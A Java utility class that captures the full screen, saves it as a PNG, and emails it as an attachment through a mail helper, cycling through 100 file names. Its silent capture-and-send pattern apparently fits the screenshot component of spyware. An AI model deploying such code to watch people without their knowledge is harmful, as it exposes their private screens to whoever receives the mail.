package imageUtil;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import mailUtil.MailUtil;
import fileUtil.FileUtil;

public class ImageUtil {
	private static Integer i = 1;
	private static MailUtil mailUtil = new MailUtil();

	public static boolean capturedImage() {
		try {
			File file = FileUtil.createFile(i.toString());

			Robot robot = new Robot();
			Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
			Rectangle screenRectangle = new Rectangle(screenSize);
			BufferedImage image = robot.createScreenCapture(screenRectangle);
			ImageIO.write(image, "png", file);
			robot.delay(80);
			i++;
			if (i > 100)
				i = 1;
			return mailUtil.sendMailWithAttachment(file);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}
}